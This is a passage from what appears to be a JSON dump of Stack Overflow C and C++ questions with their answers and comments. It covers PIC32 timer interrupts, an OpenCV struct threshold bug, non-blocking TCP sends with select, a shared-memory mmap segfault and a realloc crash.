ipl2) Timer2Handler(void)\n{\n// clear the interrupt flag\nmT2ClearIntFlag();\n    PORTToggleBits(IOPORT_B, BIT_10); \n }\n void __ISR(_TIMER_23_VECTOR, ipl2) Timer23Handler(void)\n {\n    // clear the interrupt flag\n    mT3ClearIntFlag();\n    if (direction != 0){\n        direction &lt; 1;\n    }\n    else{\n        direction != 0;\n    }\n}\n\nint main()\n{\nDeviceInit();\nDelayInit1();\nDelayInit2();\n//  DelayInit3();\n\n}\nvoid DelayInit1()   \n{\nunsigned int tcfg1;\n\n/* Configure Timer 1. This sets it up to count a 10Mhz with a period of 0xFFFF\n  */\n    tcfg1 =     T1_ON|T1_IDLE_CON|T1_SOURCE_INT|T1_PS_1_8|T1_GATE_OFF|T1_SYNC_EXT_OFF;\nOpenTimer1(tcfg1, 0xFFFF);\n\n}\n\n\nvoid DelayInit2()\n{\nunsigned int tcfg2;\n\n// Config Timer 2. This sets it to count 312500 Hz with a period of T2_TICK\ntcfg2 = T2_ON | T2_SOURCE_INT | T2_PS_1_32;\nOpenTimer2(tcfg2, T2_TICK);\n\n// Now enable system-wide multi-vector interrupt handling\nINTEnableSystemMultiVectoredInt();\n\n// Configure timer 2 interrupt with a priority of 2\nConfigIntTimer2(T2_INT_ON | T2_INT_PRIOR_2);\n\n// Clear interrupt flag\nmT2ClearIntFlag();\n}\n\nvoid DelayInit3()\n{\nunsigned int tcfg3;\n\n// Config Timer 3. This sets it to count 312500 Hz with a period of T3_TICK\ntcfg3 = T3_ON | T3_SOURCE_INT | T3_PS_1_256;\nOpenTimer23(tcfg3, T23_TICK);\n\n// Now enable system-wide multi-vector interrupt handling\nINTEnableSystemMultiVectoredInt();\n\n// Configure timer 3 interrupt with a priority of 2\nConfigIntTimer23(T23_INT_ON | T23_INT_PRIOR_2);\n\n// Clear interrupt flag\nmT3ClearIntFlag();\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "opencv", "struct"], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 5268837, "user_type": "registered", "profile_image": "https://graph.facebook.com/10205376933157992/picture?type=large", "display_name": "Andira", "link": "https://stackoverflow.com/users/5268837/andira"}, "edited": false, "score": 0, "creation_date": 1476285593, "post_id": 39994046, "comment_id": 67282368, "body": "Ahh stupid of me, I didn&#39;t double check that. thanks a lot man!"}], "tags": [], "owner": {"reputation": 4956, "user_id": 4356889, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Le2lz.png?s=128&g=1", "display_name": "szym", "link": "https://stackoverflow.com/users/4356889/szym"}, "is_accepted": true, "score": 0, "last_activity_date": 1476261291, "creation_date": 1476261291, "answer_id": 39994046, "question_id": 39991476, "link": "https://stackoverflow.com/questions/39991476/cannot-insert-struct-values-to-inrange-opencv/39994046#39994046", "title": "cannot insert struct values to inRange openCV", "body": "<p><code>orange.iHighV</code> is not initialized. In your code:</p>\n\n<pre><code>orange.iLowH = 0;\norange.iHighH = 100;\norange.iLowS = 182;\norange.iHighS = 255;\norange.iLowV = 100;\norange.iLowH = 255;\n//      ^^ overwrites previous value 0, should probably be iHighV instead.\n</code></pre>\n\n<p>The actual thresholds differ between the two versions (<code>iHighH = 30</code> vs <code>orange.iHighH = 100</code> and <code>iLowV = 0</code> vs <code>orange.iLowV = 100</code>), so that could also lead to different results.</p>\n"}], "owner": {"reputation": 13, "user_id": 5268837, "user_type": "registered", "profile_image": "https://graph.facebook.com/10205376933157992/picture?type=large", "display_name": "Andira", "link": "https://stackoverflow.com/users/5268837/andira"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 30, "favorite_count": 0, "accepted_answer_id": 39994046, "answer_count": 1, "score": 0, "last_activity_date": 1476261291, "creation_date": 1476252109, "last_edit_date": 1476254958, "question_id": 39991476, "link": "https://stackoverflow.com/questions/39991476/cannot-insert-struct-values-to-inrange-opencv", "title": "cannot insert struct values to inRange openCV", "body": "<p>I can't seem to insert the value of a member on a struct to an inRange function. The program compiles but the threshold is not working as it suppose to. If I insert a value not from a struct it works well.</p>\n\n<pre><code>struct objects{\n   int iLowH;\n   int iHighH;\n\n   int iLowS; \n   int iHighS;\n\n   int iLowV; \n   int iHighV;\n\n   Point coordinate;\n};\n\n\nint iLowH = 0;\nint iHighH = 30;\n\nint iLowS = 182; \nint iHighS = 255;\n\nint iLowV = 0;\nint iHighV = 255;\n\nint refArea=10000;\n\norange.iLowH = 0;\norange.iHighH = 100;\norange.iLowS = 182;\norange.iHighS = 255;\norange.iLowV = 100;\norange.iLowH = 255;\n\ninRange(hsvImage, Scalar(iLowH, iLowS, iLowV), Scalar(iHighH, iHighS, iHighV), threshold);\n\nimshow(\"hsv\",threshold);\n</code></pre>\n\n<p>This works well</p>\n\n<pre><code>struct objects{\n   int iLowH;\n   int iHighH;\n\n   int iLowS; \n   int iHighS;\n\n   int iLowV; \n   int iHighV;\n\n   Point coordinate;\n};\n\n\nint iLowH = 0;\nint iHighH = 30;\n\nint iLowS = 182; \nint iHighS = 255;\n\nint iLowV = 0;\nint iHighV = 255;\n\nint refArea=10000;\n\norange.iLowH = 0;\norange.iHighH = 100;\norange.iLowS = 182;\norange.iHighS = 255;\norange.iLowV = 100;\norange.iLowH = 255;\n\ninRange(hsvImage, Scalar(orange.iLowH, orange.iLowS, orange.iLowV), Scalar(orange.iHighH, orange.iHighS, orange.iHighV), threshold);\n\nimshow(\"hsv\",threshold);\n</code></pre>\n\n<p>this does not work. The threshold image only shows black. if I change the value of iLowH = orange.iLowH and so on it will not work either. if I change one of them it will not work also. If I print the value of orange it shows the correct values, and if I print the data type of orange it shows int for each of them.</p>\n"}, {"tags": ["c", "sockets", "tcp", "multiplexing"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1476251035, "post_id": 39991227, "comment_id": 67260716, "body": "Be careful when doing <code>while ((didread = read(fd, buff, MAX)))</code>. Remember that <code>read</code> returns <code>-1</code> on failure, and sinze <code>-1</code> is non-zero it is considered &quot;true&quot;. Also, if the code shown is not in the <code>main</code> function then you have a resource leak as you don&#39;t close the file you open."}, {"owner": {"reputation": 57, "user_id": 6579345, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f955d6b40c1fd77e06ed3397e8afc8ea?s=128&d=identicon&r=PG&f=1", "display_name": "ryuu", "link": "https://stackoverflow.com/users/6579345/ryuu"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1476251688, "post_id": 39991227, "comment_id": 67260949, "body": "@JoachimPileborg Thanks, I fixed it."}, {"owner": {"reputation": 3310, "user_id": 1853605, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2ab8d886abc51e874c1ed067b912ddd?s=128&d=identicon&r=PG", "display_name": "Potato", "link": "https://stackoverflow.com/users/1853605/potato"}, "edited": false, "score": 0, "creation_date": 1476253695, "post_id": 39991227, "comment_id": 67261737, "body": "that } else { for open seems to add no value"}, {"owner": {"reputation": 57, "user_id": 6579345, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f955d6b40c1fd77e06ed3397e8afc8ea?s=128&d=identicon&r=PG&f=1", "display_name": "ryuu", "link": "https://stackoverflow.com/users/6579345/ryuu"}, "reply_to_user": {"reputation": 3310, "user_id": 1853605, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2ab8d886abc51e874c1ed067b912ddd?s=128&d=identicon&r=PG", "display_name": "Potato", "link": "https://stackoverflow.com/users/1853605/potato"}, "edited": false, "score": 0, "creation_date": 1476254268, "post_id": 39991227, "comment_id": 67261965, "body": "@kkk yes, but whatever, that&#39;s just not my point...."}, {"owner": {"reputation": 3310, "user_id": 1853605, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b2ab8d886abc51e874c1ed067b912ddd?s=128&d=identicon&r=PG", "display_name": "Potato", "link": "https://stackoverflow.com/users/1853605/potato"}, "edited": false, "score": 0, "creation_date": 1476255764, "post_id": 39991227, "comment_id": 67262742, "body": "that&#39;s why it is a comment and not an answer ;)"}, {"owner": {"reputation": 81087, "user_id": 104458, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/cc46b8a10ecb92e61aaeb1efe436a0c8?s=128&d=identicon&r=PG", "display_name": "selbie", "link": "https://stackoverflow.com/users/104458/selbie"}, "edited": false, "score": 1, "creation_date": 1476256717, "post_id": 39991227, "comment_id": 67263294, "body": "Let&#39;s start with a question about your premise.  Why do you want to use non-blocking sockets?  There are valid reasons, but it doesn&#39;t appear your code attempts to take advantage of any such reason.  Also, why are you using <code>usleep</code> instead of <code>select</code> or <code>poll</code> ?"}, {"owner": {"reputation": 57, "user_id": 6579345, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f955d6b40c1fd77e06ed3397e8afc8ea?s=128&d=identicon&r=PG&f=1", "display_name": "ryuu", "link": "https://stackoverflow.com/users/6579345/ryuu"}, "reply_to_user": {"reputation": 81087, "user_id": 104458, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/cc46b8a10ecb92e61aaeb1efe436a0c8?s=128&d=identicon&r=PG", "display_name": "selbie", "link": "https://stackoverflow.com/users/104458/selbie"}, "edited": false, "score": 0, "creation_date": 1476257518, "post_id": 39991227, "comment_id": 67263728, "body": "@selbie If a client is downloading a huge file from a host run this program, and it&#39;s a large file takes a long time to transfer, so during the transmission, other clients can&#39;t access this host cause the process is block by send. So I think non blocking is ok, but non blocking send won&#39;t send all the data when the buffer is completely full, then I use a sleep to wait and see if the next time send will have space(that makes another blocking send, even I am using non blocking socket), what I want to know is how to let others be able to access the server during transferring large file."}, {"owner": {"reputation": 3265, "user_id": 2606938, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/7gIUB.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2606938/prabhu"}, "edited": false, "score": 0, "creation_date": 1476257965, "post_id": 39991227, "comment_id": 67263989, "body": "One way is that you need to a have a socket thread which does the <code>accept</code> and <code>recv</code> and worker threads which do the <code>send</code>. If you aren&#39;t going for multi-threads, there is no way you can have &quot;others access the server&quot; because the one thread is stuck doing the <code>send</code>"}, {"owner": {"reputation": 57, "user_id": 6579345, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f955d6b40c1fd77e06ed3397e8afc8ea?s=128&d=identicon&r=PG&f=1", "display_name": "ryuu", "link": "https://stackoverflow.com/users/6579345/ryuu"}, "reply_to_user": {"reputation": 3265, "user_id": 2606938, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/7gIUB.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2606938/prabhu"}, "edited": false, "score": 0, "creation_date": 1476258890, "post_id": 39991227, "comment_id": 67264534, "body": "@Prabhu Because I can&#39;t figure out another way except multithreading I asked this question, so if there is no other way, maybe I should use multithreading, just curious, if the http sever use multithreading, isn&#39;t that inefficient? As many many clients request the server at the same time, each one of them consumes a thread(that&#39;s only my guess)."}, {"owner": {"reputation": 3265, "user_id": 2606938, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/7gIUB.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2606938/prabhu"}, "edited": false, "score": 0, "creation_date": 1476260996, "post_id": 39991227, "comment_id": 67265790, "body": "Kevin, you can have a thread pool. Offload the work to them as clients connect. You need not have one thread per connection, which can be inefficient if you want to scale the server application."}, {"owner": {"reputation": 57, "user_id": 6579345, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f955d6b40c1fd77e06ed3397e8afc8ea?s=128&d=identicon&r=PG&f=1", "display_name": "ryuu", "link": "https://stackoverflow.com/users/6579345/ryuu"}, "reply_to_user": {"reputation": 3265, "user_id": 2606938, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/7gIUB.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2606938/prabhu"}, "edited": false, "score": 0, "creation_date": 1476261489, "post_id": 39991227, "comment_id": 67266081, "body": "@Prabhu OK. Thanks."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1476290029, "post_id": 39991227, "comment_id": 67285466, "body": "<code>p += didsent;</code> After initialisation, p is <i>always</i> incremented, but <i>never reset</i> to point at buff at every <code>didread = read(fd, buff, MAX)</code> outer loop iteration."}, {"owner": {"reputation": 57, "user_id": 6579345, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f955d6b40c1fd77e06ed3397e8afc8ea?s=128&d=identicon&r=PG&f=1", "display_name": "ryuu", "link": "https://stackoverflow.com/users/6579345/ryuu"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1476320666, "post_id": 39991227, "comment_id": 67299318, "body": "@wildplasser thanks. I fixed it, actually, I didn&#39;t use that code, so I didn&#39;t compile and check it, may got lots of errors, sorry."}], "answers": [{"comments": [{"owner": {"reputation": 57, "user_id": 6579345, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f955d6b40c1fd77e06ed3397e8afc8ea?s=128&d=identicon&r=PG&f=1", "display_name": "ryuu", "link": "https://stackoverflow.com/users/6579345/ryuu"}, "edited": false, "score": 0, "creation_date": 1476324650, "post_id": 40003683, "comment_id": 67300287, "body": "Let&#39;s just focus on send(), your code mainly says that we have a flag <code>reading_request</code> for each connection, if a single send() in a select() handling loop did&#39;t send all data, we don&#39;t set <code>reading_request</code> to true(that means we won&#39;t handle the request in next select() handling loop) and try to send rest data in next handling loop until all data has been sent, right? Sorry if my bad English confuses you. xD"}, {"owner": {"reputation": 81087, "user_id": 104458, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/cc46b8a10ecb92e61aaeb1efe436a0c8?s=128&d=identicon&r=PG", "display_name": "selbie", "link": "https://stackoverflow.com/users/104458/selbie"}, "reply_to_user": {"reputation": 57, "user_id": 6579345, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f955d6b40c1fd77e06ed3397e8afc8ea?s=128&d=identicon&r=PG&f=1", "display_name": "ryuu", "link": "https://stackoverflow.com/users/6579345/ryuu"}, "edited": false, "score": 0, "creation_date": 1476374367, "post_id": 40003683, "comment_id": 67328802, "body": "Correct.  I&#39;m trying to point out that you need to have allocate a data structure to be associated with each socket to maintain the state of the connection, the open file handle that you are reading from, and preferably the temp buffer, (<code>buff</code> in your example), instead of using stack variables.  Does that make sense?"}, {"owner": {"reputation": 57, "user_id": 6579345, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f955d6b40c1fd77e06ed3397e8afc8ea?s=128&d=identicon&r=PG&f=1", "display_name": "ryuu", "link": "https://stackoverflow.com/users/6579345/ryuu"}, "edited": false, "score": 0, "creation_date": 1476376081, "post_id": 40003683, "comment_id": 67329963, "body": "Yeah I get you. Thanks for your effective answer."}], "tags": [], "owner": {"reputation": 81087, "user_id": 104458, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/cc46b8a10ecb92e61aaeb1efe436a0c8?s=128&d=identicon&r=PG", "display_name": "selbie", "link": "https://stackoverflow.com/users/104458/selbie"}, "is_accepted": true, "score": 3, "last_activity_date": 1608845660, "last_edit_date": 1608845660, "creation_date": 1476289588, "answer_id": 40003683, "question_id": 39991227, "link": "https://stackoverflow.com/questions/39991227/tcp-socket-multiplexing-send-large-data/40003683#40003683", "title": "TCP Socket Multiplexing Send Large Data", "body": "<p>This is the general pattern for a single-threaded server that works with multiple connections and non-blocking sockets.</p>\n<p>It's primarily pseudo-code in C and doesn't do the necessary error checking.  But it gives you an idea that for each accepted connection, you keep a struct instance that maintains the socket handle, request parsing state, response stream, and any other &quot;state&quot; members of that connection.  Then you just loop using &quot;select&quot; to wait or having multiple threads doing this same thing.</p>\n<p>Again this is only pseudo-code and uses select/poll as an example.  You can get even more scalability with epoll.</p>\n<pre><code>while (1)\n{\n    fd_set readset = {};\n    fd_set writeset = {};\n\n    for (int i = 0; i &lt; number_of_client_connections; i++)\n    {\n        if (client_connections[i].reading_request)\n            FD_SET(client_connection.sock, &amp;readset);\n        else\n            FD_SET(client_connection.sock, &amp;writeset);\n    }\n\n    // add the listen socket to the read set\n    FD_SET(listen_socket, &amp;readset);\n\n    select(n + 1, &amp;readset, &amp;writeset, &amp;timeout); // wait for a socket to be ready (not shown - check for errors and return value)\n\n    if (FD_ISSET(listen_socket, &amp;readset))\n    {\n        int new_client_socket = accept(listen_socket, &amp;addr, &amp;addrlength);\n\n        // create a struct that keeps track of the connection state data\n        struct ConnectionData client_connection = {};\n        client_connection.sock = new_client_socket;\n        client_connection.reading_request = 1;  // awaiting for all the request bytes to come in\n        client_connections[number_of_client_connections++] = client_connection;  // pseudo code, add the client_connection to the list\n    }\n\n\n    for (int i = 0; i &lt; number_of_client_connections; i++)\n    {\n        if (client_connections[i].reading_request)\n        {\n            if (FD_ISSET(client_connections[i], &amp;readset))\n            {\n                char buffer[2000];\n                int len = recv(client_connections[i].sock, buffer, 2000, 0);\n                // not shown - handle error case when (recv &lt; 0)\n                // not shown - handle case when (recv == 0)\n                ProcessIncomingData(client_connections[i], buffer, len);  // do all the request parsing here.  Flip the client_connections[i].reading_request to 0 if ready to respond\n            }\n        }\n        else if (client_connections[i].reading_request == 0)\n        {\n            if (FD_ISSET(client_connections[i], &amp;writeset))\n            {\n                client_connection* conn = &amp;client_connections[i];\n                int len = send(conn-&gt;sock, conn-&gt;response_buffer + conn-&gt;txCount, conn-&gt;response_size - conn-&gt;txCount, 0);\n                conn-&gt;txCount += len;\n\n                if (conn-&gt;txCount == conn-&gt;response_size)\n                {\n                    // done sending response - we can close this connection or change it to back to the reading state\n                }\n            }\n        }\n    }\n</code></pre>\n"}], "owner": {"reputation": 57, "user_id": 6579345, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f955d6b40c1fd77e06ed3397e8afc8ea?s=128&d=identicon&r=PG&f=1", "display_name": "ryuu", "link": "https://stackoverflow.com/users/6579345/ryuu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 612, "favorite_count": 1, "accepted_answer_id": 40003683, "answer_count": 1, "score": 1, "last_activity_date": 1608845660, "creation_date": 1476250805, "last_edit_date": 1476320450, "question_id": 39991227, "link": "https://stackoverflow.com/questions/39991227/tcp-socket-multiplexing-send-large-data", "title": "TCP Socket Multiplexing Send Large Data", "body": "<p>Got some trouble with TCP socket multiplexing.</p>\n\n<pre><code>      //socket is non-blocking\n      const int MAX = 4096;\n      char *buff[MAX];\n      char *p = buff;\n      int fd, rvalue;\n      rvalue = 0;\n\n      if ( (fd = open(path, O_RDONLY)) &lt; 0 ) {\n          return errno;\n      } else {\n        int didsend, didread;\n        int shouldsend;\n        while ((didread = read(fd, buff, MAX)) &gt; 0) {\n          p = buff;\n          shouldsend = didread;\n          while ( 1 ) {\n            didsend = send(sockfd, p, shouldsend, 0);\n            //if send succeeds and returns the number of bytes fewer than asked for then try to send rest part in next time.\n            if (didsend &lt; shouldsend) {\n              p += didsent;\n              shouldsend -= didsend;\n              continue;\n            }\n            //if there is no place for new data to send, then wait a brief time and try again.\n            if ( didsend &lt; 0 &amp;&amp; (errno == EWOULDBLOCK || errno == EAGAIN) ) {\n              usleep(1000);\n              continue;\n            }\n            //if all data has been sent then sending loop is over.\n            if (didsend == shouldsend) {\n              break;\n            }\n            //send error\n            if ( didsend &lt; 0 ) {\n              rvalue = errno;\n              break;\n            }\n          }\n        }\n        close(fd);\n        if (didread == -1) {\n          return errno;\n        }\n        return rvalue;\n      }\n</code></pre>\n\n<p>Assume I use an I/O Multiplexing function poll() or kqueue(), and non-blocking socket, then if there are only some small data like send a short message, it works fine.</p>\n\n<p>But if it comes to large data, I mean larger than send()'s buffer size, since using non-blocking socket, send() will just send a portion of data, and return how much data it sends, the rest part of data can only be sent in another call of send(), but it takes time, and can't tell how long it will takes. So the second while() is actually a blocking send which using non-blocking socket.</p>\n\n<p>Equivalent to\uff1a</p>\n\n<pre><code>  //socket is blocking\n  const int MAX = 4096;\n  char *buff[MAX];\n  int fd, n;\n  if ( (fd = open(path, O_RDONLY)) &lt; 0 ) {\n      return errno;\n  } else {\n    while ((n = read(fd, buff, MAX)) &gt; 0) {\n      if (send(sockfd, buff, n, 0) &lt; 0) {\n        return errno;\n      }\n    }\n    close(fd);\n    return 0;\n  }\n</code></pre>\n\n<p>So, what is the solution to this, multithreading might work but that's kind of wasting resource maybe.</p>\n"}, {"tags": ["c", "struct", "posix", "shared-memory"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1476250817, "post_id": 39991185, "comment_id": 67260633, "body": "The <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/mmap.html\" rel=\"nofollow noreferrer\"><code>mmap</code> function</a> returns <code>-1</code> which means there was an error. You must remember to <i>always</i> check for errors."}, {"owner": {"reputation": 53, "user_id": 6643278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06eb02b4eace480594234a4787301be5?s=128&d=identicon&r=PG&f=1", "display_name": "UserXYZ", "link": "https://stackoverflow.com/users/6643278/userxyz"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1476251960, "post_id": 39991185, "comment_id": 67261048, "body": "Oh yes! You are right. I checked all the error code and I removed the O_EXCL flag in the shm_open and it is working. Thank you."}], "owner": {"reputation": 53, "user_id": 6643278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/06eb02b4eace480594234a4787301be5?s=128&d=identicon&r=PG&f=1", "display_name": "UserXYZ", "link": "https://stackoverflow.com/users/6643278/userxyz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 458, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1540580786, "creation_date": 1476250557, "last_edit_date": 1540580786, "question_id": 39991185, "link": "https://stackoverflow.com/questions/39991185/can-i-map-a-structure-into-a-shared-memory-file", "title": "Can I map a structure into a shared memory file?", "body": "<p>I am trying to open a shared memory segment in my main process. My terminology may be incorrect in the question but this is what I am trying to achieve:</p>\n\n<p>I collect information from 7 sensors and from that I evaluate the state. I made a structure <code>senStruct</code>. I want to share the 7 sensor and state information to other processes with use of shared memory. In code I am opening the <code>senfile</code>, mapping the <code>senStruct</code> into it. Now I simply want to store something into state and it gives me an error. </p>\n\n<p>Here is the code:</p>\n\n<pre><code>#include &lt;fcntl.h&gt; /* Defines O_* constants */\n#include &lt;sys/stat.h&gt; /* Defines mode constants */\n#include &lt;sys/mman.h&gt;   \n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n\ntypedef struct senStruct {\n    int sensor[7];\n    int state;\n}senStruct;\n\nint main()\n{\n    int fd;\n    size_t size = sizeof(senStruct);\n    senStruct *p;\n    fd = shm_open( \"senfile\" , O_CREAT | O_EXCL | O_RDWR, S_IRUSR | S_IWUSR );\n    ftruncate (fd, size);\n    printf(\"Before mapping...p points to %p\\n\",p);\n    p =(senStruct *) mmap (NULL , size, PROT_READ | PROT_WRITE,MAP_SHARED , fd, 0);\n    printf(\"After mapping...p points to %p\\n\",p);\n    p-&gt;state=1;\n    return 0;\n}\n</code></pre>\n\n<p>Output is:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Before mapping...p points to (nil)\nAfter mapping...p points to 0xffffffffffffffff\nSegmentation fault (core dumped)\n</code></pre>\n\n<p>Address of <code>p</code> after <code>p</code> seems doubtful to me. Looking into gdb indicates segmentation fault at <code>p-&gt;state = 1</code>. Is my procedure incorrect or did I miss anything?</p>\n"}, {"tags": ["c", "realloc"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1476378727, "post_id": 39990966, "comment_id": 67331473, "body": "in C, the returned type from any of the heap memory allocation functions (malloc, calloc, realloc) is <code>void*</code> so can be assigned to any other pointer.  Casting just clutters the code.  Suggest removing the casting.  Always check (!=NULL) the returned value to assure the operation was successful.  Could save some debugging by initializing the contents of struct stack to <code>0, 0, NULL</code>.  (realloc will handle a NULL pointer properly)"}, {"owner": {"reputation": 3, "user_id": 7005540, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1dad9660e0a679a357c3ff797573dc53?s=128&d=identicon&r=PG&f=1", "display_name": "Aleksei Udalov", "link": "https://stackoverflow.com/users/7005540/aleksei-udalov"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1500976348, "post_id": 39990966, "comment_id": 77560947, "body": "@user3629249 thank you!"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 7005540, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1dad9660e0a679a357c3ff797573dc53?s=128&d=identicon&r=PG&f=1", "display_name": "Aleksei Udalov", "link": "https://stackoverflow.com/users/7005540/aleksei-udalov"}, "edited": false, "score": 0, "creation_date": 1476250195, "post_id": 39991026, "comment_id": 67260433, "body": "Oh, really. Thank you very much!"}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": true, "score": 1, "last_activity_date": 1476250103, "last_edit_date": 1476250103, "creation_date": 1476249779, "answer_id": 39991026, "question_id": 39990966, "link": "https://stackoverflow.com/questions/39990966/how-to-use-realloc-strange-behavior/39991026#39991026", "title": "How to use realloc (strange behavior)", "body": "<p>You are passing the wrong size to <code>realloc</code>. As a consequence, your program runs into undefined behavior in no time.</p>\n\n<p>Use:</p>\n\n<pre><code>st-&gt;arr = realloc(st-&gt;arr, sizeof(*st-&gt;arr)*st-&gt;maxsize);\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 7005540, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1dad9660e0a679a357c3ff797573dc53?s=128&d=identicon&r=PG&f=1", "display_name": "Aleksei Udalov", "link": "https://stackoverflow.com/users/7005540/aleksei-udalov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "accepted_answer_id": 39991026, "answer_count": 1, "score": 0, "last_activity_date": 1476250103, "creation_date": 1476249378, "question_id": 39990966, "link": "https://stackoverflow.com/questions/39990966/how-to-use-realloc-strange-behavior", "title": "How to use realloc (strange behavior)", "body": "<p>So I have a program and its work fine.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#define STACKDEFSIZE 1\ntypedef struct\n{\n  unsigned long int maxsize;\n  unsigned long int cursize;\n  unsigned long int* arr;\n} stack;\n\nstack* create_stack()\n{\n  stack* res = (stack*)malloc(sizeof(stack));\n  res-&gt;arr = malloc(sizeof(long) * STACKDEFSIZE);\n  res-&gt;maxsize = STACKDEFSIZE;\n  res-&gt;cursize = 0;\n  return res;\n}\n\nvoid push(stack* st, int val)\n{\n  if (st-&gt;cursize  == st-&gt;maxsize)\n  {\n    unsigned long int* old = st-&gt;arr;\n    st-&gt;maxsize *= 2;\n    st-&gt;arr = malloc(sizeof(unsigned long int) * st-&gt;maxsize);\n    int i;\n    for(i = 0; i &lt; st-&gt;cursize; i++)\n      st-&gt;arr[i] = old[i];\n    free(old);\n  }\n  st-&gt;arr[st-&gt;cursize] = val;\n  st-&gt;cursize += 1;\n}\n\nint main() {\n  stack* s = create_stack();\n  int i;\n  for(i = 0; i &lt; 10000; i++)\n  {\n    push(s, i);\n  }\n  return 0;\n}\n</code></pre>\n\n<p>But if I change function 'push' to use realloc instead of malloc and free, program crash with message \" Error in `./t': realloc(): invalid next size: 